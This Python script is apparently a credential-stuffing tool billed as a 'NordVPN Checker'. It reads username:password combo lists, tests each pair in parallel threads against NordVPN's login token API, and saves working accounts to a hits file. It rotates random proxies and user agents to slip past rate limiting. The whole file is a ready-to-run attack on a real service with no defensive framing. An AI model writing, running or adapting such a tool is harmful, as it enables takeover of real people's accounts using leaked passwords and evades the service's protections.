from colorama import init,Fore,Style
from os import name,system
from sys import stdout
from random import choice
from threading import Thread,Lock,active_count
from fake_useragent import UserAgent
from time import sleep
from bs4 import BeautifulSoup
import requests

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120
            
    def SetTitle(self,title_name:str):
        if name in ('ce', 'nt', 'dos'):
            system("title {0}".format(title_name))
        else:
            stdout.write("\x1b]2;{0}\x07".format(title_name))

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def ReadFile(self,filename,method):
        with open(filename,method) as f:
            content = [line.strip('\n') for line in f]
            return content

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('proxies.txt','r')
        proxies = {}
        if self.proxy_type == 1:
            proxies = {
                "http":"http://{0}".format(choice(proxies_file)),
                "https":"https://{0}".format(choice(proxies_file))
            }
        elif self.proxy_type == 2:
            proxies = {
                "http":"socks4://{0}".format(choice(proxies_file)),
                "https":"socks4://{0}".format(choice(proxies_file))
            }
        else:
            proxies = {
                "http":"socks5://{0}".format(choice(proxies_file)),
                "https":"socks5://{0}".format(choice(proxies_file))
            }
        return proxies

    def TitleUpdate(self):
        while True:
            try:
                self.SetTitle('One Man Builds NordVPN Checker Tool | HITS: {0} | BADS: {1} | RETRIES: {2} | THREADS: {3}'.format(self.hits,self.bads,self.retries,active_count()-1))
            except:
                self.SetTitle('One Man Builds NordVPN Checker Tool ^| HITS: {0} ^| BADS: {1} ^| RETRIES: {2} ^| THREADS: {3}'.format(self.hits,self.bads,self.retries,active_count()-1))
            sleep(0.1)

    def __init__(self):
        init(convert=True)
        self.clear()
        self.SetTitle('One Man Builds NordVPN Checker Tool')
        self.title = Style.BRIGHT+Fore.RED+"""                                        
                 _   _               _ _   _______ _   _   _____  _   _  _____ _____  _   __ ___________ 
                | \ | |             | | | | | ___ \ \ | | /  __ \| | | ||  ___/  __ \| | / /|  ___| ___ \\
                |  \| | ___  _ __ __| | | | | |_/ /  \| | | /  \/| |_| || |__ | /  \/| |/ / | |__ | |_/ /
                | . ` |/ _ \| '__/ _` | | | |  __/| . ` | | |    |  _  ||  __|| |    |    \ |  __||    / 
                | |\  | (_) | | | (_| \ \_/ / |   | |\  | | \__/\| | | || |___| \__/\| |\  \| |___| |\ \ 
                \_| \_/\___/|_|  \__,_|\___/\_|   \_| \_/  \____/\_| |_/\____/ \____/\_| \_/\____/\_| \_|

                
        """
        print(self.title)
        self.hits = 0
        self.bads = 0
        self.retries = 0
        self.ua = UserAgent()
        self.lock = Lock()
        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
        
        if self.use_proxy == 1:
            self.proxy_type = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Https ['+Fore.RED+'2'+Fore.CYAN+']Socks4 ['+Fore.RED+'3'+Fore.CYAN+']Socks5: '))
        
        self.threads_num = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
        print('')

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        combos = self.ReadFile('combos.txt','r')
        for combo in combos:
            Run = True
            username = combo.split(':')[0]
            password = combo.split(':')[-1]

            while Run:
                if active_count()<=self.threads_num:
                    Thread(target=self.NordVPN,args=(username,password)).start()
                    Run = False

    def NordVPN(self,username,password):
        try:
            session = requests.session()
            link = 'https://api.nordvpn.com/v1/users/tokens'
            json_payload = {}
            json_payload['username'] = username
            json_payload['password'] = password

            headers = {
                'User-Agent':self.ua.random,
                'Content-Type':'application/json',
                'Accept':'*/*',
                'Accept-Encoding':'gzip, deflate, br',
                'Connection':'keep-alive'
            }
            response = ''

            if self.use_proxy == 1:
                response = session.post(link,headers=headers,json=json_payload,proxies=self.GetRandomProxy())
            else:
                response = session.post(link,headers=headers,json=json_payload)

            if 'user_id' in response.text:
                self.PrintText(Fore.CYAN,Fore.RED,'HIT','{0}:{1}'.format(username,password))
                with open('hits.txt','a',encoding='utf8') as f:
                    f.write('{0}:{1}\n'.format(username,password))
                self.hits = self.hits+1
            elif 'Unauthorized' in response.text:
                self.PrintText(Fore.RED,Fore.CYAN,'BAD','{0}:{1}'.format(username,password))
                with open('bads.txt','a',encoding='utf8') as f:
                    f.write('{0}:{1}\n'.format(username,password))
                self.bads = self.bads+1
            else:
                self.retries = self.retries+1
                self.NordVPN(username,password)
        except:
            self.retries = self.retries+1
            self.NordVPN(username,password)

if __name__ == '__main__':
    main = Main()
    main.Start()